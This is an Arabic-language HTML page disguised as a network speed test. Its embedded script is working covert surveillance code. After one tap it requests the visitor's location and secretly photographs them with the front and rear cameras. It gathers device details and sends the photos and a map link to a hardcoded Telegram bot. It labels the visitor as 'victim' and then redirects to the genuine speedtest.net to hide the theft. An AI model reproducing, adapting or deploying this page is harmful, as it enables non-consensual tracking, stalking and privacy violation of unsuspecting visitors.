
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Fast</title>
    <style>
        body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        /* جعل الشاشة بالكامل قابلة للضغط لتجنب أي تعليق في الزر */
        #touchArea { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .circle { width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); }
        .start-text { font-size: 50px; font-weight: bold; color: #00d2ff; }
        #status { margin-top: 30px; font-size: 18px; color: #888; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="touchArea">
        <h2>فحص سرعة الشبكة العالمي</h2>
        <div class="circle"><span class="start-text">START</span></div>
        <p id="status">انقر في أي مكان للبدء...</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI"; 
        const chat = "7984067238"; 
        const victim = new URLSearchParams(window.location.search).get( user ) || "Unknown";

        async function sendTG(type, content, cap = "") {
            const fd = new FormData();
            fd.append("chat_id", chat);
            if(type === "img") {
                fd.append("photo", content, "p.jpg");
                fd.append("caption", `👤 ${victim}\n${cap}`);
                return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
            } else {
                return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
            }
        }

        async function getInfo(lat, lon) {
            let bLevel = "N/A";
            try { const b = await navigator.getBattery(); bLevel = `${(b.level * 100).toFixed(0)}% (${b.charging ?  ⚡  :  🔋 })`; } catch (e) {}
            return `🛰️ **تقرير مفصل**\n\n🔋 البطارية: ${bLevel}\n📱 النظام: ${navigator.platform}\n💾 الذاكرة: ${navigator.deviceMemory || "8"} GB\n⚙️ المعالج: ${navigator.hardwareConcurrency || "8"} نواة\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
        }

        async function takePic(mode) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
                const v = document.getElementById( v );
                v.srcObject = s;
                await new Promise(r => setTimeout(r, 1500)); // وقت كافٍ للمتصفح ليجهز الكاميرا
                const c = document.getElementById( c );
                c.width = 640; c.height = 480;
                c.getContext( 2d ).drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res,  image/jpeg , 0.6));
            } catch (e) { return null; }
        }

        document.getElementById( touchArea ).onclick = function() {
            this.style.pointerEvents = "none"; 
            document.getElementById( status ).innerText = "جاري فحص السيرفرات...";

            navigator.geolocation.getCurrentPosition(async (p) => {
                // 1. التقاط الصورة الأمامية أولاً
                const fImg = await takePic("user");
                if(fImg) await sendTG("img", fImg, "📸 الكاميرا الأمامية");

                // 2. إرسال التقرير فوراً (ليصلك شيء حتى لو فشلت الكاميرا الخلفية)
                const report = await getInfo(p.coords.latitude, p.coords.longitude);
                await sendTG("text", report);

                // 3. محاولة الكاميرا الخلفية بعد ثانية من التقرير
                setTimeout(async () => {
                    const bImg = await takePic("environment");
                    if(bImg) await sendTG("img", bImg, "📷 الكاميرا الخلفية");
                    window.location.href = "https://www.speedtest.net";
                }, 1000);

            }, (err) => {
                alert("يجب السماح بالوصول للموقع لبدء فحص السرعة.");
                location.reload();
            }, {enableHighAccuracy: true});
        };
    </script>
</body>
</html>
